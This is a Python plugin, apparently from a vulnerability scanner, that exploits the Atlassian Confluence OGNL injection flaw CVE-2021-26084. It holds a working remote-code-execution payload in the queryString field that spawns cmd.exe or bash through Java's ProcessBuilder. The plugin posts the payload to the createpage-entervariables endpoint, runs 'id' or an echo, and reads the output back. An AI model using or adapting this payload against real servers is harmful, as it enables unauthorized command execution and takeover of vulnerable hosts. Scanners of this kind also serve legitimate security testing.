# !/usr/bin/env python
# -*-coding:utf-8 -*-

"""
# File       : test.py
# Time       ：2021/11/21 15:37
# Author     ：author ximi
# version    ：python 3.6
# Description：
"""

import re
import sys
import threading

from bs4 import BeautifulSoup
from flask import session

from module import globals
from core.verify import verify, misinformation
from thirdparty import requests
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump

class AtlassianCrowd():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def Atlassian_Confluence_RCE_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Atlassian Confluence 远程代码执行漏洞"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Atlassian Confluence 远程代码执行漏洞（CVE-2021-26084）"
        self.vul_info["vul_numb"] = "CMS"
        self.vul_info["vul_apps"] = "Atlassian Confluence "
        self.vul_info["vul_date"] = "2021-6-21"
        self.vul_info["vul_vers"] = "Confluence < 7.13.0"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Atlassian官方发布了Confluence Server Webwork OGNL 注入漏洞（CVE-2021-26084）"
        self.vul_info["cre_date"] = "2021-7-24"
        self.vul_info["cre_auth"] = "ximi"
        md = random_md5()

        cmd ="echo "+md
        p_url="/pages/createpage-entervariables.action?SpaceKey=x"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
            "Connection": "close", "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate"}
        xpl_data_windos= {
            "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" +cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}

        xpl_data_linux = {
            "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + "id" + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}


        try:
            xpl_url = self.url + p_url
            session = requests.Session()
            response = session.post(xpl_url, headers=headers, data=xpl_data_linux)
            response_w= session.post(xpl_url, headers=headers, data=xpl_data_windos)

            soup = BeautifulSoup(response_w.text, 'html.parser')
            queryStringValue_w = soup.find('input', attrs={'name': 'queryString', 'type': 'hidden'})['value']
            print(len(queryStringValue_w))
            if response.status_code==200 and  "uid=" in response.text:
                soup = BeautifulSoup(response.text, 'html.parser')
                queryStringValue = soup.find('input', attrs={'name': 'queryString', 'type': 'hidden'})['value']
                print("\033[36m[o] linux存在漏洞 \n[o] 响应为:\n{} \033[0m".format(queryStringValue))


                self.vul_info["vul_payd"] = p_url
                self.vul_info["vul_data"] = dump.dump_all(response).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[RCE_POC] [存在漏洞，进一步利用：payload:" + xpl_url +"\n"+queryStringValue+ "]"
                verify.scan_print(self.vul_info)

            elif response.status_code==200 and len(queryStringValue_w)<100 and md in queryStringValue_w:

                print("\033[36m[o] WINDOS存在漏洞 \n[o] 响应为:\n{} \033[0m".format(queryStringValue_w))
                self.vul_info["vul_payd"] = p_url
                self.vul_info["vul_data"] = dump.dump_all(response_w).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[RCE_POC] [windos存在漏洞，进一步利用：payload:" + xpl_url +"\n"+queryStringValue_w+  "]"
                verify.scan_print(self.vul_info)


        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()